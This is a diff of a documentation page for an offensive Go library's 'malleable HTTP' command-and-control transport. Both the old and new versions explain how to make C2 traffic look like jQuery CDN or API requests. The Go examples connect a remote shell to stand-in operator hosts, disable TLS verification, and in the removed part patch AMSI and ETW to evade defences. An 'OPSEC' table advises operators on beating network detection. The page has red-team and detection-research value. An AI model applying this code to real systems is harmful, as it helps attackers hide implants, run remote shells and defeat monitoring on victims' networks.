@@ -1,117 +1,164 @@
-# Malleable HTTP Profiles
-
-[<- Back to C2 Overview](README.md)
-
-**MITRE ATT&CK:** [T1071.001 - Application Layer Protocol: Web Protocols](https://attack.mitre.org/techniques/T1071/001/)
-**D3FEND:** [D3-NTA - Network Traffic Analysis](https://d3fend.mitre.org/technique/d3f:NetworkTrafficAnalysis/)
-
 ---
+package: github.com/oioio-space/maldev/c2/transport
+last_reviewed: 2026-04-27
+reflects_commit: 36484a4
+---
+
+# Malleable HTTP profiles
+
+[← c2 index](README.md) · [docs/index](../../index.md)
+
+## TL;DR
+
+Wrap any HTTP transport in a **profile** that shapes traffic to look
+like benign web activity: GET to plausible CDN-style URIs, custom
+headers (`Referer`, `Accept`), real browser User-Agent, optional data
+encoders. A network analyst inspecting the wire sees jQuery downloads,
+not C2 callbacks.
 
 ## Primer
 
-Even with TLS encryption, network monitors can see the URL patterns, HTTP headers, and request timing of your C2 traffic. If your malware makes POST requests to `/api/data` every 5 seconds, that is easy to spot.
+TLS encrypts payload bytes; it does not hide HTTP **structure**.
+Network analysts who terminate TLS at a corporate proxy (or just see
+flow metadata) still observe URL paths, request frequencies, header
+sets, and body sizes. A reverse shell that hits `/api/data` every
+five seconds is trivially clusterable.
 
-**Your spy communications look like normal jQuery CDN requests.** The malleable profile transforms C2 data into HTTP requests that mimic legitimate web traffic -- GET requests to `/jquery-3.7.1.min.js`, with proper `Referer` and `Accept` headers, using a real Chrome User-Agent. A network analyst sees what looks like a website loading jQuery from a CDN.
+Malleable profiles steal a trick from Cobalt Strike: shape the C2
+into HTTP requests that look like ordinary web traffic. The profile
+holds:
 
----
+- **`GetURIs`** — list of URI patterns for data retrieval. The
+  transport rotates through them. Examples:
+  `/jquery-3.7.1.min.js`, `/static/css/bootstrap.min.css`.
+- **`PostURIs`** — same for data submission.
+- **`Headers`** — custom request headers (`Referer`, `Accept`,
+  `Cache-Control`).
+- **`UserAgent`** — pinned User-Agent string. Pair with
+  [`useragent`](../../../useragent) for randomised real-browser UAs.
+- **`DataEncoder` / `DataDecoder`** — optional transforms applied to
+  payload bytes before the request body is built / after the response
+  body is parsed. Lets the operator wrap C2 in (e.g.) a fake JSON
+  envelope, hide it inside an image-shaped blob, or further encrypt
+  on top of TLS.
 
-## How It Works
-
-### Data Flow
+## How it works
 
 ```mermaid
 sequenceDiagram
-    participant Shell as Shell / Stager
-    participant Mall as MalleableTransport
-    participant Net as Network
-    participant C2 as C2 Server
+    participant Sh as c2/shell or stager
+    participant Mal as Malleable transport
+    participant CDN as Operator handler (looks like CDN)
 
-    Note over Mall: Profile: JQueryCDN()
-
-    Shell->>Mall: Write(c2_data)
-    Mall->>Mall: base64Encode(c2_data)
-    Mall->>Net: POST /jquery-3.7.1.min.map<br/>Accept: text/javascript<br/>Referer: https://code.jquery.com/<br/>User-Agent: Chrome/120
-    Net->>C2: (looks like jQuery source map upload)
-
-    Shell->>Mall: Read(buf)
-    Mall->>Net: GET /jquery-3.7.1.min.js<br/>Accept: text/javascript<br/>Referer: https://code.jquery.com/
-    C2-->>Net: HTTP 200 + base64(response_data)
-    Net-->>Mall: base64 encoded response
-    Mall->>Mall: base64Decode(response)
-    Mall-->>Shell: raw c2_data
+    Sh->>Mal: Write([]byte("ls /etc"))
+    Mal->>Mal: DataEncoder(bytes)
+    Mal->>CDN: GET /jquery-3.7.1.min.js<br/>Referer: https://docs.example/<br/>User-Agent: Chrome/124
+    CDN-->>Mal: 200 OK + payload-as-jquery
+    Mal->>Mal: DataDecoder(body)
+    Mal-->>Sh: Read → []byte("/etc/passwd contents")
 ```
 
-### Profile Structure
+The handler on the operator side accepts requests on the same URIs
+and responds with the next chunk. With realistic timing (jitter, sleep)
+the traffic is indistinguishable from a slow CDN page-load.
 
-```mermaid
-graph TD
-    subgraph "Profile"
-        GA["GetURIs\n/jquery-3.7.1.min.js\n/jquery-3.7.1.slim.min.js"]
-        PA["PostURIs\n/jquery-3.7.1.min.map\n/jquery-ui.min.js"]
-        HD["Headers\nAccept: text/javascript\nReferer: https://code.jquery.com/"]
-        UA["UserAgent\nChrome/120.0.0.0"]
-        ENC["DataEncoder\nbase64Encode()"]
-        DEC["DataDecoder\nbase64Decode()"]
-    end
+## API Reference
 
-    subgraph "Request"
-        GET["GET /jquery-3.7.1.min.js"] -->|"uses"| GA
-        GET -->|"headers"| HD
-        GET -->|"User-Agent"| UA
-        POST["POST /jquery-3.7.1.min.map"] -->|"uses"| PA
-        POST -->|"encode body"| ENC
-        POST -->|"headers"| HD
-    end
+### `transport.Profile`
 
-    subgraph "Response"
-        RESP["HTTP 200 body"] -->|"decode"| DEC
-    end
+[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/c2/transport#Profile)
+
+```go
+type Profile struct {
+    GetURIs     []string
+    PostURIs    []string
+    Headers     map[string]string
+    UserAgent   string
+    DataEncoder func([]byte) []byte
+    DataDecoder func([]byte) []byte
+}
 ```
 
-### URI Rotation
+### `transport.NewMalleable(address string, timeout time.Duration, profile *Profile, opts ...MalleableOption) *Malleable`
 
-The transport cycles through URIs to avoid repeated requests to the same path:
+[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/c2/transport#NewMalleable)
 
-```text
-Request 1: GET /jquery-3.7.1.min.js
-Request 2: GET /jquery-3.7.1.slim.min.js
-Request 3: GET /jquery-3.7.1.min.js      (wraps around)
-```
+Construct a malleable HTTP transport. `address` is the operator
+endpoint (`https://operator.example`); `profile` shapes traffic;
+opts include `WithTLSConfig(...)` to inject a custom `*http.Transport`
+(typically holding the uTLS / cert-pin configuration).
 
----
+### `transport.WithTLSConfig(*http.Transport) MalleableOption`
 
-## Usage
+[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/c2/transport#WithTLSConfig)
 
-### JQueryCDN Profile
+Inject the underlying `*http.Transport`. Compose with uTLS or
+fingerprint-pinning to harden the connection layer.
+
+## Examples
+
+### Simple
 
 ```go
 import (
+    "context"
     "time"
+
     "github.com/oioio-space/maldev/c2/transport"
 )
 
-profile := transport.JQueryCDN()
-// GET URIs:  /jquery-3.7.1.min.js, /jquery-3.7.1.slim.min.js
-// POST URIs: /jquery-3.7.1.min.map, /jquery-ui.min.js
-// Headers:   Accept: text/javascript, Referer: https://code.jquery.com/
-// Encoding:  base64
-
-trans := transport.NewMalleable("https://c2.example.com", 10*time.Second, profile)
+profile := &transport.Profile{
+    GetURIs:   []string{"/jquery-3.7.1.min.js", "/popper.min.js"},
+    PostURIs:  []string{"/api/v2/telemetry"},
+    Headers:   map[string]string{"Referer": "https://docs.example/"},
+    UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64) AppleWebKit/537.36 Chrome/124",
+}
+tr := transport.NewMalleable("https://operator.example", 10*time.Second, profile)
+_ = tr.Connect(context.Background())
 ```
 
-### GoogleAPI Profile
+### Composed (pair with the `useragent` package)
 
 ```go
-profile := transport.GoogleAPI()
-// GET URIs:  /maps/api/js, /maps/api/geocode/json
-// POST URIs: /maps/api/directions/json, /maps/api/place/findplacefromtext/json
-// Headers:   Accept: application/json, X-Goog-Api-Key: AIzaSyDummy...
-// Encoding:  base64
+import (
+    "github.com/oioio-space/maldev/c2/transport"
+    "github.com/oioio-space/maldev/useragent"
+)
 
-trans := transport.NewMalleable("https://c2.example.com", 10*time.Second, profile)
+db, _ := useragent.Load()
+ua := db.Filter(func(e useragent.Entry) bool { return e.Browser == "Chrome" }).Random()
+
+profile := &transport.Profile{
+    GetURIs:   []string{"/jquery-3.7.1.min.js"},
+    UserAgent: ua.UserAgent,
+}
+tr := transport.NewMalleable("https://operator.example", 10*time.Second, profile)
+_ = tr.Connect(context.Background())
 ```
 
-### Malleable + uTLS (Double Disguise)
+### Advanced (encoder pair — wrap C2 in a fake JSON body)
+
+```go
+import (
+    "encoding/base64"
+    "fmt"
+)
+
+profile := &transport.Profile{
+    PostURIs: []string{"/api/v1/events"},
+    DataEncoder: func(b []byte) []byte {
+        return []byte(fmt.Sprintf(`{"event":"page_view","payload":%q}`,
+            base64.StdEncoding.EncodeToString(b)))
+    },
+    DataDecoder: func(b []byte) []byte {
+        // Parse JSON, base64-decode payload, return raw bytes.
+        // Implementation omitted.
+        return decodeJSONPayload(b)
+    },
+}
+```
+
+### Complex (full chain — uTLS + cert pin + malleable + shell)
 
 ```go
 import (
@@ -119,131 +166,74 @@ import (
     "net/http"
     "time"
 
+    "github.com/oioio-space/maldev/c2/shell"
     "github.com/oioio-space/maldev/c2/transport"
 )
 
-// Combine malleable HTTP with JA3-spoofed TLS
-tlsTransport := &http.Transport{
+httpTr := &http.Transport{
     TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 }
 
-profile := transport.JQueryCDN()
-trans := transport.NewMalleable("https://c2.example.com", 10*time.Second, profile,
-    transport.WithTLSConfig(tlsTransport),
-)
-```
-
-### Custom Profile
-
-```go
 profile := &transport.Profile{
-    GetURIs:  []string{"/api/v1/status", "/api/v1/health"},
-    PostURIs: []string{"/api/v1/telemetry", "/api/v1/events"},
-    Headers: map[string]string{
-        "Accept":        "application/json",
-        "X-Api-Version": "2.1",
-        "Authorization": "Bearer eyJ0eXAi...",
-    },
-    UserAgent:   "MyApp/2.1.0 (Monitoring Agent)",
-    DataEncoder: func(data []byte) []byte { /* custom encoding */ return data },
-    DataDecoder: func(data []byte) []byte { /* custom decoding */ return data },
+    GetURIs:   []string{"/jquery-3.7.1.min.js", "/bootstrap.min.css"},
+    PostURIs:  []string{"/api/v2/metrics"},
+    UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64) Chrome/124",
+    Headers:   map[string]string{"Referer": "https://docs.example/"},
 }
+tr := transport.NewMalleable("https://cdn.example.com", 10*time.Second, profile,
+    transport.WithTLSConfig(httpTr))
 
-trans := transport.NewMalleable("https://api.example.com", 10*time.Second, profile)
+sh := shell.New(tr, nil)
+_ = sh.Start(context.Background())
+sh.Wait()
 ```
 
----
+## OPSEC & Detection
 
-## Combined Example: Full Malleable Shell
+| Artefact | Where defenders look |
+|---|---|
+| Identical URI in every C2 cycle | NIDS clustering — rotate through `GetURIs` and randomise |
+| Stale User-Agent strings | Defenders periodically refresh "real browser UA" lists; pair with [`useragent`](../../../useragent) for fresh entries |
+| `Referer` always identical or absent | Behavioural NIDS; vary the `Referer` per cycle if possible |
+| POST/GET ratio mismatched with cover content (e.g. constant POSTs to a "static asset" URI) | Heuristic — match GET/POST distribution to the cover content |
+| Body size patterns (every request exactly 32 KB) | Add randomised padding inside `DataEncoder` |
+| TLS handshake fingerprint | Pair with uTLS via `WithTLSConfig` + a uTLS-backed `*http.Transport` |
 
-```go
-package main
+**D3FEND counters:**
 
-import (
-    "context"
-    "time"
+- [D3-NTA](https://d3fend.mitre.org/technique/d3f:NetworkTrafficAnalysis/)
+  — content + header analysis on TLS-terminated traffic.
+- [D3-FCR](https://d3fend.mitre.org/technique/d3f:FileContentRules/)
+  — YARA-like rules on response bodies.
 
-    "github.com/oioio-space/maldev/c2/shell"
-    "github.com/oioio-space/maldev/c2/transport"
-    "github.com/oioio-space/maldev/evasion"
-    "github.com/oioio-space/maldev/evasion/amsi"
-    "github.com/oioio-space/maldev/evasion/etw"
-    wsyscall "github.com/oioio-space/maldev/win/syscall"
-)
+**Hardening for the operator:** keep `GetURIs` plausible and
+rotate; choose a cover that matches the operator endpoint's
+hostname (a CDN-shaped FQDN paired with `/jquery-*.min.js` is
+believable; `/api/data` is not); randomise jitter at the shell
+layer.
 
-func main() {
-    caller := wsyscall.New(wsyscall.MethodIndirect,
-        wsyscall.Chain(wsyscall.NewTartarus(), wsyscall.NewHalosGate()),
-    )
-    defer caller.Close()
+## MITRE ATT&CK
 
-    // jQuery CDN profile -- traffic looks like a website loading jQuery
-    profile := transport.JQueryCDN()
-    trans := transport.NewMalleable("https://cdn-c2.example.com", 10*time.Second, profile)
+| T-ID | Name | Sub-coverage | D3FEND counter |
+|---|---|---|---|
+| [T1071.001](https://attack.mitre.org/techniques/T1071/001/) | Application Layer Protocol: Web Protocols | HTTP traffic shaping | D3-NTA |
 
-    sh := shell.New(trans, &shell.Config{
-        MaxRetries:    0,
-        ReconnectWait: 5 * time.Second,
-        MaxBackoff:    5 * time.Minute,
-        JitterFactor:  0.3,
-        Evasion: []evasion.Technique{
-            amsi.ScanBufferPatch(),
-            etw.All(),
-        },
-        Caller: caller,
-    })
+## Limitations
 
-    sh.Start(context.Background())
-}
-```
+- **No bidirectional streaming.** HTTP is request/response. The
+  shell layer batches I/O into discrete chunks.
+- **Body size cap.** Some CDNs / proxies truncate at 1–10 MB. Chunk
+  large transfers across multiple requests.
+- **Encoder/decoder discipline.** Profiles are operator + implant
+  pairs — both sides must agree on `DataEncoder` / `DataDecoder`.
+- **No malleable C2 profile DSL.** This package implements the
+  primitives; defining a Cobalt Strike-style `.profile` DSL parser
+  is out of scope.
 
----
+## See also
 
-## Advantages & Limitations
-
-### Advantages
-
-- **Blends with legitimate traffic**: URIs, headers, and User-Agent match real web services
-- **URI rotation**: Cycles through multiple URIs to reduce pattern detection
-- **Pluggable encoding**: Custom `DataEncoder`/`DataDecoder` functions for any encoding scheme
-- **Built-in profiles**: JQueryCDN and GoogleAPI ready to use out of the box
-- **Composable with TLS**: `WithTLSConfig` option allows custom TLS configuration
-
-### Limitations
-
-- **HTTP-only transport**: No raw TCP -- all data flows through HTTP request/response cycles
-- **Latency**: HTTP overhead per Read/Write compared to raw TCP
-- **No WebSocket**: Long-polling via GET, not persistent connections
-- **Server cooperation**: C2 server must understand the same profile (URI patterns, encoding)
-- **No request jitter**: Timing between requests is not randomized at the transport level
-
----
-
-## API Reference
-
-### Profile
-
-```go
-type Profile struct {
-    GetURIs     []string                // URI patterns for GET requests
-    PostURIs    []string                // URI patterns for POST requests
-    Headers     map[string]string       // Custom HTTP headers
-    UserAgent   string                  // User-Agent header
-    DataEncoder func([]byte) []byte     // Encode data before sending
-    DataDecoder func([]byte) []byte     // Decode received data
-}
-```
-
-### Built-in Profiles
-
-```go
-func JQueryCDN() *Profile   // Mimics jQuery CDN traffic
-func GoogleAPI() *Profile   // Mimics Google Maps API traffic
-```
-
-### MalleableTransport
-
-```go
-func NewMalleable(address string, timeout time.Duration, profile *Profile, opts ...MalleableOption) *MalleableTransport
-func WithTLSConfig(tlsTransport *http.Transport) MalleableOption
-```
+- [Transport](transport.md) — base `Transport` interface and uTLS
+  integration via `WithTLSConfig`.
+- [`useragent`](../../../useragent) — random real-browser UAs.
+- [Cobalt Strike, *Malleable C2 Profile reference*](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_main.htm)
+  — primer on the technique class (different DSL, same idea).
